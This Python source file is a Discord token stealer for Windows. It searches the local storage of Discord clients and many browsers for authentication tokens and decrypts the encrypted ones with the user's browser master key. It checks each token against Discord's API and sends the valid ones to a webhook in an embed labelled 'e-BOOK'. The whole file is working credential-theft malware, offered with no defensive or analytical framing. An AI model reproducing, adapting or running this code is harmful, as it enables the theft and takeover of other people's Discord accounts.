import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

class Made_By_Omar:
    def __init__(omar):
        omar.baseurl = "https://discord.com/api/v9/users/@me"
        omar.appdata = os.getenv("localappdata")
        omar.roaming = os.getenv("appdata")
        omar.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        omar.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        omar.tokens = []
        omar.ids = []
        omar.made_by_xii5_on_discord()

    def decrypt_val(omar, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(omar, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def made_by_xii5_on_discord(omar):
        paths = {
            'Discord': omar.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': omar.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': omar.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': omar.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': omar.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': omar.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': omar.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': omar.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': omar.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': omar.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': omar.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': omar.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': omar.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': omar.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': omar.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': omar.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': omar.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': omar.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': omar.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': omar.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': omar.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': omar.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': omar.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': omar.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': omar.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': omar.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': omar.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(omar.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(omar.encrypted_regex, line):
                                token = omar.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), omar.get_master_key(omar.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(omar.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in omar.ids:
                                        omar.tokens.append(token)
                                        omar.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(omar.regex, line):
                            r = requests.get(omar.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in omar.ids:
                                    omar.tokens.append(token)
                                    omar.ids.append(uid)

    def create_embed(omar, title, description, color, fields=None):
        embed = {
            "title": title,
            "description": description,
            "color": color,
        }
        if fields:
            embed["fields"] = fields
        return embed

    def send_tokens(omar, webhook):
        if not omar.tokens:
            return

        main_embed = omar.create_embed("Made By OmaR", "\n\n <:key:1085891172066664509> " + "".join(omar.tokens), 16711680)

        headers = {
            "Content-Type": "application/json"
        }

        data = {
            "embeds": [main_embed],
            "username": "OmaR e-BOOK",
            "avatar_url": "https://i.imgur.com/dgnrMFo.gif"
        }

        try:
            response = requests.post(webhook, json=data, headers=headers)
            if response.status_code == 204:
                print("e-BOok.")
            else:
                print("Failed.")
        except Exception as e:
            print(f"An error occurred while sending the webhook: {e}")
